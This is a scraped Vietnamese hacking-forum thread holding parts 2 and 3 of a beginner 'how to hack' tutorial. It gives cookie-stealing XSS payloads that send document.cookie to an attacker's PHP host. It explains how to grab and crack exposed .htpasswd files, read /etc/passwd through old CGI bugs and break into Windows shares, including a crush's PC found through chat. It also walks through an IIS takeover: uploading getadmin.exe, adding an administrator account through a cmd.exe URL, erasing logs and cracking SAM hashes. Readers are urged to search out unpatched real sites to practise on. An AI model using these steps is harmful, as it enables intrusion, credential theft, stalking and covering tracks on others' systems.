</blockquote><br/><br/> (Bạn hãy sửa cái <a href="mailto:victim@yahoo.com">victim@yahoo.com</a> thành địa chỉ Mail của bạn ) .<br/><br/> Bạn hãy save cái notepad này với tên “&lt; tên tuỳ các bạn &gt;.php ” ( Nhớ là phải có .php ) rồi upload lên một host nào đó có hỗ trợ PHP , trong VD của tôi là abc.php .( Đối với các bạn đã từng làm Web chắc sẽ rất dễ phảI không ? ) . Đoạn mã này sẽ có nhiệm vụ ăn cắp thông tin (và có khi có cả cookie ) của nạn nhân khi họ mở dữ liệu có chứa đoạn mã này rồI tự động save thông tin đó thành file &lt; ip của nạn nhân &gt;.txt .<br/> _ Còn một cách nữa để lấy cookie đựơc sử dụng trên các forum bị lỗi nhưng chưa fix , khi post bài bạn chi cần thêm đoạn mã sau vào bài của mình :<br/><br/><br/> <blockquote>CODE<br/> document.write('&lt;img src=http://host_php/abc.php?abc='+escape(document.cookie)+'&gt;')&nbsp;
</blockquote><br/><br/><br/> với host_php : là địa chỉ bạn đã upload file ăn cắp cookie đó lên .<br/> và abc.php là file VD của tôi .<br/> _ Ví dụ : khi áp dụng trong tag img, ta dùng như sau:<br/><br/><br/> <blockquote>CODE<br/> [img]javascript: Document.write('&lt;img src=http://host_php/docs.php?docs='+escape(document.cookie)+'&gt;')[/img] &nbsp;
</blockquote><br/><br/> hoặc:<br/><br/><br/> <blockquote>CODE<br/> img]javascript: Document.write('&#x3cimg src=http://host_php/docs.php?docs='+escape(document.cookie)+'&#x3e')[/img] &nbsp;
</blockquote><br/><br/> _ Bạn có thể tìm những trang web để thực hành thử cách trong VD này bằng cách vào google.com tìm những forum bị lỗi này bằng từ khoá "Powered by …….. forum” với những forum sau : ikonboard, Ultimate Bulletin Board , vBulletin Board, Snitz . Nếu các bạn may mắn các bạn có thể tìm thấy những forum chưa fix lỗi này mà thực hành , ai tìm được thì chia sẽ với mọi người nhé .<br/> _ Còn nhiều đoạn mã ăn cắp cookie cũng hay lắm , các bạn hãy tự mình tìm thêm .<br/><br/> <b>22 . ) Cách ngắt mật khẩu bảo vệ Website :</b><br/><br/> _ Khi các bạn tới tìm kiếm thông tin trên một trang Web nào đó , có một số chỗ trên trang Web đó khi bạn vào sẽ bị chặn lại và sẽ xuất hiện một box yêu cầu nhập mật khẩu , đây chính là khu vực riêng tư cất dấu những thông tin mật chỉ dành cho số người hoặc một nhóm người nào đó ( Nơi cất đồ nghề hack của viethacker.net mà báo e-chip đã nói tới chẳng hạn ) . Khi ta click vào cái link đó thì ( thông thường ) nó sẽ gọi tới .htpasswd và .htaccess nằm ở cùng trong thư mục bảo vệ trang Web . Tại sao phải dùng dấu chấm ở trước trong tên file '.htaccess'? Các file có tên bắt đầu là một dấu chấm '.' sẽ được các web servers xem như là các file cấu hình. Các file này sẽ bị ẩn đi (hidden) khi bạn xem qua thư mục đã được bảo vệ bằng file .htaccess .Hai hồ sơ này có nhiệm vụ điều khiển sự truy nhập tới cái link an toàn mà bạn muốn xâm nhập đó . Một cái quản lý mật khẩu và user name , một cái quản lý công việc mã hoá những thông tin cho file kia . Khi bạn nhập đúng cả 2 thì cái link đó mới mở ra . Bạn hãy nhìn VD sau :<br/><br/> <blockquote><br/> CODE<br/> Graham:F#.DG*m38d%RF<br/> Webmaster:GJA54j.3g9#$@f&nbsp;
</blockquote><br/><br/><br/> Username bạn có thể đọc được rùi , còn cái pass bạn nhìn có hiểu mô tê gì không ? Dĩ nhiên là không rồi . bạn có hiểu vì sao không mà bạn không thể đọc được chúng không ? cái này nó có sự can thiệp của thằng file .htaccess . Do khi cùng ở trong cùng thư mục chúng có tác động qua lại để bảo vệ lẫn nhau nên chúng ta cũng không dại gì mà cố gắng đột nhập rồi crack mớ mật khẩu chết tiệt đó ( khi chưa có đồ nghề crack mật khẩu trong tay . Tôi cũng đang nghiên cứu để có thể xâm nhập trực tiếp , nếu thành công tôi sẽ post lên cho các bạn ) . Lỗi là ở đây , chuyện gì sẽ xảy ra nếu cái .htpasswd nằm ngoài thư mục bảo vệ có file .htaccess ? Ta sẽ chôm được nó dễ dàng , bạn hãy xem link VD sau :<br/><br/><span class="link"> http://www.company.com/cgi-bin/protected/</span><br/><br/><br/> hãy kiểm tra xem file .htpasswd có được bảo vệ bởI .htaccess hay không , ta nhập URL sau :<br/><br/><span class="link"> http://www.company.com/cgi-bin/protected/.htpasswd</span><br/><br/> Nếu bạn thấy có câu trả lờI 'File not found' hoặc tương tự thì chắc chắn file này đã không được bảo vệ , bạn hãy tìm ra nó bằng một trong các URL sau :<br/><br/><span class="link"> http://www.company.com/.htpasswd</span><br/><span class="link"> http://www.company.com/cgi-bin/.htpasswd</span><br/><span class="link"> http://www.company.com/cgi-bin/passwords/.htpasswd</span><br/><span class="link"> http://www.company.com/cgi-bin/passwd/.htpasswd</span><br/><br/> nếu vẫn không thấy thì các bạn hãy cố tìm bằng các URL khác tương tự ( có thể nó nằm ngay ở thư mục gốc đấy ) , cho đến khi nào các bạn tìm thấy thì thôi nhé .<br/> Khi tìm thấy file này rồi , bạn hãy dùng chương trình "John the ripper" hoặc "Crackerjack", để crack passwd cất trong đó . Công việc tiếp theo hẳn các bạn đã biết là mình phải làm gì rồI , lấy user name và passwd hợp lệ đột nhập vào rùi xem thử mấy cô cậu “tâm sự” những gì trong đó , nhưng các bạn cũng đừng có đổi pass của họ hay quậy họ nhé .<br/> Cách này các bạn cũng có thể áp dụng để lấy pass của admin vì hầu hết những thành viên trong nhóm kín đều là “có chức có quyền” cả .<br/><br/> <b>23 . ) Tìm hiểu về CGI ?</b><br/> _ CGI là từ viết tắt của Common Gateway Interface , đa số các Website đều đang sử dụng chương trình CGI ( được gọI là CGI script ) để thực hiện những công việc cần thiết 24 giờ hằng ngày . Những nguyên bản CGI script thực chất là những chương trình được viết và được upload lên trang Web vớI những ngôn ngữ chủ yếu là Perl , C , C++ , Vbscript trong đó Perl được ưa chuộng nhất vì sự dễ dàng trong việc viết chương trình ,chiếm một dung lượng ít và nhất là nó có thể chạy liên tục trong 24 giờ trong ngày .<br/> _ Thông thường , CGI script được cất trong thư mục /cgi-bin/ trên trang Web như VD sau :<br/><br/><span class="link"> http://www.company.com/cgi-bin/login.cgi</span><br/><br/><br/> với những công việc cụ thể như :<br/> + Tạo ra chương trình đếm số người đã ghé thăm .<br/> + Cho phép những ngườI khách làm những gì và không thể làm những gì trên Website của bạn .<br/> + Quản lý user name và passwd của thành viên .<br/> + Cung cấp dịch vụ Mail .<br/> + Cung cấp những trang liên kết và thực hiện tin nhắn qua lại giữa các thành viên .<br/> + Cung cấp những thông báo lỗi chi tiết .v.v…..<br/><br/> <b>24 . ) Cách hack Web cơ bản nhất thông qua CGI script :</b><br/><br/> _ Lỗi thứ 1 : lỗi nph-test-cgi<br/><br/> + Đánh tên trang Web bị lỗi vào trong trình duyệt của bạn .<br/> + Đánh dòng sau vào cuốI cùng : /cgi-bin/nph-test-cgi<br/> + Lúc đó trên URL bạn sẽ nhìn giống như thế này :<br/><br/><span class="link"> http://www.servername.com/cgi-bin/nph-test-cgi</span><br/><br/> + Nếu thành công bạn sẽ thấy các thư mục được cất bên trong . Để xem thư mục nào bạn đánh tiếp :<br/><br/><br/> <blockquote>CODE<br/> ?&lt;tên thư mục&gt;/*&nbsp;
</blockquote><br/><br/><br/> + file chứa passwd thường được cất trong thư mục /etc , bạn hãy đánh trên URL dòng sau :<br/><br/><span class="link"> http://www.servername.com/cgi-bin/nph-test-cgi?/etc/*</span><br/><br/> _ Lỗi thứ 2 : lỗi php.cgi<br/><br/> + Tương tự trên bạn chỉ cần đánh trên URL dòng sau để lấy pass :<br/><br/><span class="link"> http://www.servername.com/cgi-bin/php.cgi?/etc/passwd</span><br/><br/> Quan trọng là đây là những lỗi đã cũ nên việc tìm các trang Web để các bạn thực hành rất khó , các bạn hãy vào trang google.com rồi đánh từ khoá :<br/><br/> /cgi-bin/php.cgi?/etc/passwd]<br/> hoặc cgi-bin/nph-test-cgi?/etc<br/><br/> sau đó các bạn hãy tìm trên đó xem thử trang nào chưa fix lỗi để thực hành nhé .<br/><br/> <b>25 . ) Kỹ thuật xâm nhập máy tính đang online :</b><br/><br/> _ Xâm nhập máy tính đang online là một kỹ thuật vừa dễ lạI vừa khó . Bạn có thể nói dễ khi bạn sử dụng công cụ ENT 3 nhưng bạn sẽ gặp vấn đề khi dùng nó là tốc độ sử dụng trên máy của nạn nhân sẽ bị chậm đi một cách đáng kể và những máy họ không share thì không thể xâm nhập được, do đó nếu họ tắt máy là mình sẽ bị công cốc khi chưa kịp chôm account , có một cách êm thấm hơn , ít làm giảm tốc độ hơn và có thể xâm nhập khi nạn nhân không share là dùng chương trình DOS để tấn công . Ok , ta sẽ bắt đầu :<br/> _ Dùng chương trình scan IP như ENT 3 để scan IP mục tiêu .<br/> _ Vào Start ==&gt; Run gõ lệnh cmd .<br/> _ Trong cửa sổ DOS hãy đánh lệnh “net view &lt;IP của nạn nhân&gt;”<br/><br/><br/> <blockquote>CODE<br/> + VD : c:\net view 203.162.30.xx&nbsp;
</blockquote><br/><br/><br/> _ Bạn hãy nhìn kết quả , nếu nó có share thì dễ quá , bạn chỉ cần đánh tiếp lệnh<br/><br/> net use &lt;ổ đĩa bất kỳ trên máy của bạn&gt; : &lt;ip của nạn nhân&gt;&lt;ổ share của nạn nhân&gt;<br/><br/> + VD : c:\net use E : 203.162.30.xxC<br/><br/> _ Nếu khi kết nối máy nạn nhân mà có yêu cầu sử dụng Passwd thì bạn hãy download chương trình dò passwd về sử dụng ( theo tôi bạn hãy load chương trình “pqwak2” áp dụng cho việc dò passwd trên máy sử dụng HĐH Win98 hoặc Winme và chương trình “xIntruder” dùng cho Win NT ) . Chú ý là về cách sử dụng thì hai chương trình tương tự nhau , dòng đầu ta đánh IP của nạn nhân , dòng thứ hai ta đánh tên ổ đĩa share của nạn nhân nhưng đối với “xIntruder” ta chú ý chỉnh Delay của nó cho hợp lý , trong mạng LAN thì Delay của nó là 100 còn trong mạng Internet là trên dướI 5000 .<br/> _ Nếu máy của nạn nhân không có share thì ta đánh lệnh :<br/><br/> net use &lt;ổ đĩa bất kỳ trên máy của bạn&gt; : &lt;ip của nạn nhân&gt;c$ (hoặc d$)"administrator"<br/><br/> + VD : net use E : 203.162.30.xxC$"administrator"<br/><br/> Kiểu chia sẽ bằng c$ là mặc định đối với tất cả các máy USER là "administrator" .<br/> _ Chúng ta có thể áp dụng cách này để đột nhập vào máy của cô bạn mà mình “thầm thương trộm nhớ” để tìm những dữ liệu liên quan đến địa chỉ của cô nàng ( với điều kiện là cô ta đang dùng máy ở nhà và bạn may mắn khi tìm được địa chỉ đó ) . Bạn chỉ cần chat Y!Mass rồi vào DOS đánh lệnh :<br/><br/> c:\netstat –n<br/><br/> Khi dùng cách này bạn hãy tắt hết các cửa sổ khác chỉ để khung chat Y!Mass với cô ta thôi , nó sẽ giúp bạn dễ dàng hơn trong việc xác định địa chỉ IP của cô ta . Sau đó bạn dùng cách xâm nhập mà tôi đã nói ở trên .( Có lẽ anh chàng tykhung của chúng ta hồi xưa khi tán tỉnh cô bạn ở xa qua mạng cũng dùng cách này để đột nhập và tìm hiểu địa chỉ của cô ta đây mà , hi`hi` . )<br/> Bạn sẽ thành công nếu máy của nạn nhân không cài firewall hay proxy .<br/><br/> ====================================================<br/><br/> Nhiều bạn có yêu cầu tôi đưa ra địa chỉ chính xác cho các bạn thực tập , nhưng tôi không thể đưa ra được vì rút kinh nghiệm những bài hướng dẫn có địa chỉ chính xác , khi các bạn thực hành xong đoạt được quyền admin có bạn đã xoá cái database của họ . Như vậy HVA sẽ mang tiếng là nơi bắt nguồn cho sự phá hoại trên mạng . mong các bạn thông cảm , nếu có thể thì tôi chỉ nêu những cách thức để các bạn tìm những dịa chỉ bị lỗi đó chứ không đưa ra địa chỉ cụ thể nào .<br/><br/> ====================================================<br/><br/> Ở phần 4 tôi sẽ đề cập đến kỹ thuật chống xâm nhập vào máy tính của mình khi bạn online , tìm hiểu sơ các bước khi ta quyết định hack một trang Web , kỹ thuật tìm ra lỗi trang Web để thực hành , kỹ thuật hack Web thông qua lỗi Gallery.v.v…….<br/><br/> GOOKLUCK!!!!!!!!!<br/><br/> ( Hết phần 3 )<br/><br/> **************************************************************<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/131.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/131/518.html#518,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"> <font size='+3'><b>Phần 2</b></font><br/><br/> <b>14 . ) Vitual port là gì ?</b><br/><br/> _ Vitual port ( cổng ảo ) là 1 số tự nhiên đựợc gói ở trong TCP(Tranmission Control Protocol) và UDP(User Diagram Protocol) header. Như mọi nguòi đã biết, Windows có thể chạy nhiều chương trình 1 lúc, mỗi chương trình này có 1 cổng riêng dùng để truyền và nhận dữ liệu. Ví dụ 1 máy có địa chỉ IP là 127.0.0.1 chạy WebServer, FTP_Server, POP3 server, etc, những dịch vụ này đều đuọc chạy trên 1 IP address là 127.0.0.1, khi một gói tin đuọc gửi đến làm thế nào máy tính của chúng ta phân biệt được gói tin này đi vào dịch vụ nào WebServer hay FTP server hay SM! TP? Chính vì thế Port xuất hiện. Mỗi dịch vụ có 1 số port mặc định, ví dụ FTP có port mặc định là 21, web service có port mặc định là 80, POP3 là 110, SMTP là 25 vân vân.... Người quản trị mạng có thể thay đổi số port mặc định này, nếu bạn ko biết số port trên một máy chủ, bạn ko thể kết nối vào dịch vụ đó được. Chắc bạn đã từng nghe nói đến PORT MAPPING nhưng có lẽ chưa biết nó là gì và chức năng thế nào. Port mapping thực ra đơn giản chỉ là quá trình chuyển đổi số port mặc định của một dịch vụ nào đó đến 1 số khác. Ví dụ Port mặc định của WebServer là 80, nhưng thỉnh thoảng có lẽ bạn vẫn thấy<span class="link"> http://www.xxx.com:8080</span> , 8080 ở đây chính là số port của host xxx nhưng đã đuợc nguòi quản trị của host này "map" từ 80 thành 8080.<br/><br/> <i>( Tài liệu của HVA )</i><br/><br/> <b>15 . ) DNS là gì ?</b><br/><br/> _ DNS là viết tắt của Domain Name System. Một máy chủ DNS đợi kết nối ở cổng số 53, có nghĩa là nếu bạn muốn kết nối vào máy chủ đó, bạn phải kết nối đến cổng số 53. Máy chủ chạy DNS chuyển hostname bằng các chữ cái thành các chữ số tương ứng và ngược lại. Ví dụ: 127.0.0.1 --&gt; localhost và localhost---&gt;127.0.0.1 .<br/><br/> <i>( Tài liệu của HVA )</i><br/><br/> <b>16 . ) Đôi điều về Wingate :</b><br/><br/> _ WinGate là một chương trình đơn giản cho phép bạn chia các kết nối ra. Thí dụ: bạn có thể chia sẻ 1 modem với 2 hoặc nhiều máy . WinGate dùng với nhiều proxy khác nhau có thể che giấu bạn .<br/> _ Làm sao để Wingate có thể che dấu bạn ? Hãy làm theo tôi : Bạn hãy telnet trên cổng 23 trên máy chủ chạy WinGate telnet proxy và bạn sẽ có dấu nhắc WinGate &gt; . Tại dấu nhắc này bạn đánh vào tên server, cùng một khoảng trống và cổng bạn muốn kết nối vào. VD :<br/><br/> <blockquote><br/> CODE<br/> telnet wingate.net<br/> WinGate&gt; victim.com 23&nbsp;
</blockquote><br/><br/> ta telnet đến cổng 23 vì đây là cổng mặc định khi bạn cài Wingate . lúc này IP trên máy mà victim chộp được của ta là IP của máy chủ chứa Wingate proxy đó .<br/> _ Làm sao để tìm Wingate ?<br/> + Nếu bạn muốn tìm IP WinGates tĩnh (IP không đổi) thì đến yahoo hay một trang tìm kiếm cable modem. Tìm kiếm cable modems vì nhiều người dùng cable modems có WinGate để họ có thể chia sẻ đường truyền rộng của nó cable modems cho những máy khác trong cùng một nhà . Hoặc bạn có thể dùng Port hay Domain scanners và scan Port 1080 .<br/> + Để tìm IP động (IP thay đổi mỗi lần user kết nối vào internet) của WinGates bạn có thể dùng Domscan hoặc các chương trình quét khác . Nếu dùng Domscan bạn hãy nhập khoảng IP bất kỳ vào box đầu tiên và số 23 vào box thứ 2 . Khi đã có kết quả , bạn hãy thử lần lượt telnet đến các địa chỉ IP tìm đựơc ( đã hướng dẫn ở trên ), nếu nó xuất hiện dấu “Wingate &gt;” thì bạn đã tìm đúng máy đang sử dụng Wingate rồI đó .<br/> + Theo kinh nghiệm của tôi thì bạn hãy down wingatescanner về mà sài , nó có rất nhièu trên mạng .<br/><br/> <b>17 . ) Đôi điều về Traceroute :</b><br/><br/> _ Traceroute là một chương trình cho phép bạn xác định được đường đi của các gói packets từ máy bạn đến hệ thống đích trên mạng Internet.<br/> _ bạn hãy xem VD sau :<br/><br/><br/> <blockquote>CODE<br/> C:\windows&gt;tracert 203.94.12.54<br/><br/> Tracing route to 203.94.12.54 over a maximum of 30 hops<br/><br/> 1 abc.netzero.com (232.61.41.251) 2 ms 1 ms 1 ms<br/> 2 xyz.Netzero.com (232.61.41.0) 5 ms 5 ms 5 ms<br/> 3 232.61.41.10 (232.61.41.251) 9 ms 11 ms 13 ms<br/> 4 we21.spectranet.com (196.01.83.12) 535 ms 549 ms 513 ms<br/> 5 isp.net.ny (196.23.0.0) 562 ms 596 ms 600 ms<br/> 6 196.23.0.25 (196.23.0.25) 1195 ms1204 ms<br/> 7 backbone.isp.ny (198.87.12.11) 1208 ms1216 ms1233 ms<br/> 8 asianet.com (202.12.32.10) 1210 ms1239 ms1211 ms<br/> 9 south.asinet.com (202.10.10.10) 1069 ms1087 ms1122 ms<br/> 10 backbone.vsnl.net.in (203.98.46.01) 1064 ms1109 ms1061 ms<br/> 11 newdelhi-01.backbone.vsnl.net.in (203.102.46.01) 1185 ms1146 ms1203 ms<br/> 12 newdelhi-00.backbone.vsnl.net.in (203.102.46.02) ms1159 ms1073 ms<br/> 13 mtnl.net.in (203.194.56.00) 1052 ms 642 ms 658 ms &nbsp;
</blockquote><br/><br/> Tôi cần biết đường đi từ máy tôi đến một host trên mạng Internet có địa chỉ ip là 203.94.12.54. Tôi cần phải tracert đến nó! Như bạn thấy ở trên, các gói packets từ máy tôi muốn đến được 203.94.12.54 phải đi qua 13 hops(mắc xích) trên mạng. Đây là đưòng đi của các gói packets .<br/> _ Bạn hãy xem VD tiếp theo :<br/><br/><br/> <blockquote>CODE<br/> host2 # traceroute xyz.com<br/><br/> traceroute to xyz.com (202.xx.12.34), 30 hops max, 40 byte packets<br/> 1 isp.net (202.xy.34.12) 20ms 10ms 10ms<br/> 2 xyz.com (202.xx.12.34) 130ms 130ms 130ms&nbsp;
</blockquote><br/><br/> + Dòng đầu tiên cho biết hostname và địa chỉ IP của hệ thống đích. Dòng này còn cho chúng ta biết thêm giá trị TTL&lt;=30 và kích thước của datagram là 40 bytes(20-bytes IP Header + 8-bytes UDP Header + 12-bytes user data).<br/> + Dòng thứ 2 cho biết router đầu tiên nhận được datagram là 202.xy.34.12, giá trị của TTL khi gởi đến router này là 1. Router này sẽ gởi trở lại cho chương trình traceroute một ICMP message error "Time Exceeded". Traceroute sẽ gởi tiếp một datagram đến hệ thống đích.<br/> + Dòng thứ 3, xyz.com(202.xx.12.34) nhận được datagram có TTL=1(router thứ nhất đã giảm một trước đó - TTL=2-1=1). Tuy nhiên, xyz.com không phải là một router, nó sẽ gởi trở lại cho traceroute một ICMP error message "Port Unreachable". Khi nhận được ICMP message này, traceroute sẽ biết được đã đến được hệ thống đích xyz.com và kết thúc nhiệm vụ tại đây.<br/> + Trong trường hợp router không trả lời sau 5 giây, traceroute sẽ in ra một dấu sao "*"(không biết) và tiếp tục gởi datagram khác đến host đích!<br/> _Chú ý:<br/> Trong windows: tracert hostname<br/> Trong unix: traceroute hostname<br/><br/> <i>( Tài liệu của viethacker.net )</i><br/><br/> <b>18 . ) Ping và cách sử dụng :</b><br/><br/> _ Ping là 1 khái niệm rât đơn giản tuy nhiên rất hữu ích cho việc chẩn đoán mạng. Tiểu sử của từ "ping" như sau: Ping là tiếng động vang ra khi 1 tàu ngầm muốn biết có 1 vật thể khác ở gần mình hay ko, nếu có 1 vật thể nào đó gần tàu ngầm tiếng sóng âm này sẽ va vào vật thể đó và tiếng vang lại sẽ là "pong" vậy thì tàu ngầm đó sẽ biết là có gì gần mình.<br/> _Trên Internet, khái niệm Ping cũng rất giống với tiểu sử của nó như đã đề cập ở trên. Lệnh Ping gửi một gói ICMP (Internet Control Message Protocol) đến host, nếu host đó "pong" lại có nghĩa là host đó tồn tại (hoặc là có thể với tới đựoc). Ping cũng có thể giúp chúng ta biêt được luợng thời gian một gói tin (data packet) đi từ máy tính của mình đến 1 host nào đó.<br/> _Ping thật dễ dàng, chỉ cần mở MS-DOS, và gõ "ping địa_chỉ_ip", mặc định sẽ ping 4 lần, nhưng bạn cũng có thể gõ<br/><br/><br/> <blockquote>CODE<br/> "ping ip.address -t"&nbsp;
</blockquote><br/><br/> Cách này sẽ làm máy ping mãi. Để thay đổi kích thước ping làm như sau:<br/><br/><br/> <blockquote>CODE<br/> "ping -l (size) địa_chỉ_ip "&nbsp;
</blockquote><br/><br/> Cái ping làm là gửi một gói tin đến một máy tính, sau đó xem xem mất bao lâu gói tin rồi xem xem sau bao lâu gói tin đó quay trở lại, cách này xác định được tốc độ của kết nối, và thời gian cần để một gói tin đi và quay trở lại và chia bốn (gọi là "trip time"). Ping cũng có thể được dùng để làm chậm đi hoặc đổ vỡ hệ thống bằng lụt ping. Windows 98 treo sau một phút lụt ping (Bộ đệm của kết nối bị tràn – có qua nhiều kết nối, nên Windows quyết định cho nó đi nghỉ một chút). Một cuộc tấn công “ping flood” sẽ chiếm rất nhiều băng thông của bạn, và bạn phải có băng thông lớn hơn đối phương ( trừ khi đối phương là một máy chạy Windows 98 và bạn có một modem trung bình, bằng cách đó bạn sẽ hạ gục đối phương sau xấp xỉ một phút lụt ping). Lụt Ping không hiệu quả lắm đổi với những đối phương mạnh hơn một chút. trừ khi bạn có nhiều đường và bạn kiểm soát một số lượng tương đối các máy chủ cùng ping mà tổng băng thông lơn hơn đối phương.<br/> Chú ý: option –t của DOS không gây ra lụt ping, nó chỉ ping mục tiêu một cách liên tục, với những khoảng ngắt quãng giữa hai lần ping liên tiếp. Trong tất cả các hệ Unix hoặc Linux, bạn có thể dùng ping -f để gây ra lụt thực sự. Thực tế là phải ping -f nếu bạn dùng một bản tương thích POSIX (POSIX - Portable Operating System Interface dựa trên uniX), nếu không nó sẽ không phải là một bản Unix/Linux thực sự, bởi vậy nếu bạn dùng một hệ điều hành mà nó tự cho nó là Unix hay Linux, nó sẽ có tham số -f.<br/><br/> <i>( Tài liệu của HVA và viethacker.net )</i><br/><br/> <b>19 . ) Kỹ thuật xâm nhập Window NT từ mạng Internet :</b><br/><br/> _ Đây là bài học hack đầu tiên mà tôi thực hành khi bắt đầu nghiên cứu về hack , bây giờ tôi sẽ bày lại cho các bạn . bạn sẽ cần phảI có một số thờI gian để thực hiện được nó vì nó tuy dễ nhưng khó . Ta sẽ bắt đầu :<br/> _ Đầu tiên bạn cần tìm một server chạy IIS :<br/> _ Tiếp đến bạn vào DOS và đánh ' FTP &lt;the company name&gt;'. VD :<br/><br/> c:\Ftp www.dodgyinc.com<br/><br/> ( trang naỳ khi tôi thực hành thì vẫn còn làm được , bây giờ không biết họ đã fix chưa , nếu bạn nào có trang nào khác thì hãy post lên cho mọI ngườI cùng làm nhé )<br/> Nếu connect thành công , bạn sẽ thấy một số dòng tương tự như thế này :<br/><br/><br/> <blockquote>CODE<br/> Connected to www.dodgyinc.com.<br/> 220 Vdodgy Microsoft FTP Service (Version 3.0).<br/> User<span class="link"> www.dodgyinc.com<img src="/hvaonline/images/smilies/274a01ad7ad7ad7d73d5f0b399ae5db2.gif" border="0" alt="smilie" align="absbottom">none</span>)):&nbsp;
</blockquote><br/><br/> Cái mà ta thấy ở trên có chứa những thông tin rất quan trọng , nó cho ta biết tên Netbios của máy tính là “ Vdodgy ” . Từ điều này bạn có thể suy diễn ra tên mà được sử dụng cho NT để cho phép ta có thể khai thác , mặc định mà dịch vụ FTP gán cho nó nếu nó chưa đổi tên sẽ là “IUSR_VDODGY” . Hãy nhớ lấy vì nó sẽ có ích cho ta . Nhập "anonymous” trong user nó sẽ xuất hiện dòng sau :<br/><br/> <blockquote><br/> CODE<br/> 331 Anonymous access allowed, send identity (e-mail name) as password.<br/> Password:&nbsp;
</blockquote><br/> Bây giờ passwd sẽ là bất cứ gì mà ta chưa biết , tuy nhiên , bạn hãy thử đánh vào passwd là “anonymous” . Nếu nó sai , bạn hãy log in lạI thiết bị FTP , bạn hãy nhớ là khi ta quay lạI lần này thì không sử dụng cách mạo danh nữa ( anonymous ) mà sử dụng “'Guest” , thử lại passwd với “guest” xem thế nào .<br/> Bây giờ bạn hãy đánh lệnh trong DOS :<br/><br/><br/> CODE<br/> Cd /c<br/><br/><br/> Và sẽ nhìn thấy kết quả nếu như bạn đã xâm nhập thành công , bây giờ bạn hãy nhanh chóng tìm thư mục 'cgi-bin' . Nếu như bạn may mắn , bạn sẽ tìm được dễ dàng vì thông thường hệ thống quản lý đã đặt 'cgi-bin' vào nơi mà ta vừa xâm nhập để cho các ngườI quản lý họ dễ dàng điều khiển mạng hơn . thư mục cgi-bin có thể chứa các chương trình mà bạn có thể lợi dụng nó để chạy từ trình duyệt Web của bạn . Ta hãy bắt đầu “quậy” nào .<br/> _ Đầu tiên , bạn hãy chuyển tớ thư mục cgi-bin và sử dụng lệnh “Binary” ( có thể các bạn không cần dùng lệnh này ) , sau đó bạn dánh tiếp lệnh “put cmd.exe” . Tiếp theo là bạn cần có file hack để cài vào thư mục này , hãy tìm trên mạng để lấy 2 file quan trọng nhất đó là 'getadmin.exe' và 'gasys.dll' . Download chúng xuống , một khi bạn đã có nó hãy cài vào trong thư mục cgi-bin . Ok , coi như mọI việc đã xong , bạn hãy đóng cửa sổ DOS .<br/> Bây giờ bạn hãy đánh địa chỉ sau lên trình duyệt của bạn :<br/><br/><span class="link"> http://www.dodgyinc.com/cgi-bin/getadmin.exe?IUSR_VDODGY</span><br/><br/> Sau vài giây bạn sẽ có được câu trả lời như ở dướI đây :<br/> <blockquote><br/><br/> CODE<br/> CGI Error<br/> The specified CGI application misbehaved by not returning a complete set of HTTP headers. The headers it did return are:<br/> Congratulations , now account IUSR_VDODGY have administrator rights! &nbsp;
</blockquote><br/><br/> Thế là bạn đã mạo danh admin để xâm nhập hệ thống , việc cần thiết bây giờ là bạn hãy tự tạo cho mình một account , hãy đánh dòng sau trên IE :<br/><br/><span class="link"> http://www.dodgyinc.com/cgi-</span> bin/cmd.exe?/c%20c:\winnt\system32\net.exe%20user%20hacker%20toilahacker%20/add<br/><br/> dòng lệnh trên sẽ tạo cho bạn một account login với user : anhdenday và passwd : toilahackerBây giờ bạn hãy là cho user này có account của admin , bạn chỉ cần đánh lên IE lệnh :<br/><br/><span class="link"> http://www.dodgyinc.com/cgi-bin/getadmin.exe?anhdenday</span><br/><br/> Vậy là xong rùi đó , bạn hãy disconnect và đến start menu -&gt; find rồi search computer 'www.dodgyinc.com'. Khi tìm thấy , bạn vào explore , explore NT sẽ mở ra bạn hay nhập user và passwd để mở nó ( của tôi là user : anhdenday và passwd : toilahacker ) .<br/><br/> Có một vấn đề là khi bạn xâm nhập hệ thống này thì sẽ bị ghi lại , do đó để xoá dấu vết bạn hãy vào 'Winnt\system32\logfiles' mở file log đó rồI xoá những thông tin liên quan đến bạn , rồI save chúng . Nếu bạn muốn lấy một thông báo gì về việc chia sẽ sự xâm nhập thì bạn hãy thay đổi ngày tháng trên máy tính vớI URL sau :<br/><br/><span class="link"> http://www.dodgyinc.com/cgi-bin/cmd.exe?/c%20date%2030/04/03</span><br/><br/> xong rồI bạn hãy xoá file 'getadmin.exe', và 'gasys.dll' từ 'cgi-bin' . Mục đích khi ta xâm nhập hệ thống này là “chôm” pass của admin để lần sau xâm nhập một cách hợp lệ , do đó bạn hãy tìm file SAM ( chứa pass của admin và member ) trong hệ thống rồI dùng chương trình “l0pht crack” để crack pass ( Hướng dẫn về cách sử dụng “l0pht crack v 3.02” tôi đã post lên rồi ,các bạn hãy tự nghiên cứu nhé ) . Đây là link :<span class="link"> http://vnhacker.org/forum/?act=ST&f=6&t=11566&s=</span><br/> Khi crack xong các bạn đã có user và pass của admin rồI , bây giờ hãy xoá account của user ( của tôi là “anhdenday” ) đi cho an toàn . Bạn đã có thể làm gì trong hệ thống là tuỳ thích , nhưng các bạn đừng xoá hết tài liệu của họ nhé , tội cho họ lắm .<br/> Bạn cảm thấy thế nào , rắc rối lắm phải không . Lúc tôi thử hack cách này , tôi đã mày mò mất cả 4 giờ , nếu như bạn đã quen thì lần thứ 2 bạn sẽ mất ít thờI gian hơn .<br/><br/> Ở phần 3 tôi sẽ đề cập đến HĐH Linux , đến cách ngắt mật khẩu bảo vệ của một Web site , và làm thế nào để hack một trang web đơn giản nhất .v.v…<br/><br/> GOOKLUCK !!!!!!<br/><br/> ( (Hết phần 2 )<br/> ********************************************************<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
